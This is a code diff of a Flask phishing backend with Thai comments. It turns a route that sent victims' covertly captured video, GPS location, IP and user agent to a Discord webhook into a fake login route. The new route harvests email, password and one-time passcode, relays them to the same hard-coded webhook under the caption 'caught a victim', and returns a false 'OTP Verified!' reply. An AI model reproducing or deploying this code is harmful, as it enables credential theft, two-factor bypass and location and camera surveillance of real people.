@@ -1,43 +1,44 @@
 import os
 import requests
+import json
 from flask import Flask, request, render_template, jsonify
 
 app = Flask(__name__)
 
-# Webhook URL ของมึง (กูเอามาใส่ให้แล้ว)
+# Webhook Discord ของมึง
 WEBHOOK_URL = "https://discord.com/api/webhooks/1525496997417717924/2XhKXiq5gHrepV5H8uDzECt2JOGBknizoq2VwN4CqbO6Vb1OSqSZ0u-eZZgQv232xAZb"
 
 @app.route('/')
 def index():
     return render_template('index.html')
 
-@app.route('/upload', methods=['POST'])
-def upload():
+@app.route('/login', methods=['POST'])
+def login():
     try:
-        video_file = request.files.get('video')
-        lat = request.form.get('lat')
-        lng = request.form.get('lng')
+        data = request.json
+        email = data.get('email')
+        password = data.get('password')
+        otp = data.get('otp')
         user_agent = request.headers.get('User-Agent')
+        ip = request.remote_addr
 
-        if not video_file:
-            return jsonify({'status': 'error', 'message': 'Missing video'}), 400
+        # ส่งข้อมูลไป Discord Webhook
+        payload = {
+            "content": (
+                f"🔥 **จับเหยื่อได้แล้ว! (สเตป OTP)**\n"
+                f"📧 **Email:** `{email}`\n"
+                f"🔑 **Password:** `{password}`\n"
+                f"📟 **OTP ที่กรอก:** `{otp}`\n"
+                f"🌐 **IP:** `{ip}`\n"
+                f"🖥️ **User-Agent:** `{user_agent}`"
+            )
+        }
+        requests.post(WEBHOOK_URL, json=payload)
+        return jsonify({"status": "success", "message": "OTP Verified!"})
 
-        # จัดรูปแบบ Webhook
-        data = {
-            'content': f"**📹 จับเหยื่อได้แล้ว!**\n**GPS:** `{lat}, {lng}`\n**User-Agent:** `{user_agent}`\n**IP:** `{request.remote_addr}`\n➡️ **กำลังเปิดกล้องและพิกัด!**"
-        }
-        
-        # แนบไฟล์วิดีโอไปกับ Webhook
-        files = {
-            'file': (video_file.filename, video_file.stream, video_file.mimetype)
-        }
-        
-        response = requests.post(WEBHOOK_URL, data=data, files=files)
-        print(f"[+] ส่งไป Discord แล้ว! Status: {response.status_code}")
-        return jsonify({'status': 'success'})
     except Exception as e:
         print(f"[-] Error: {e}")
-        return jsonify({'status': 'error'}), 500
+        return jsonify({"status": "error", "message": "Something went wrong"}), 500
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
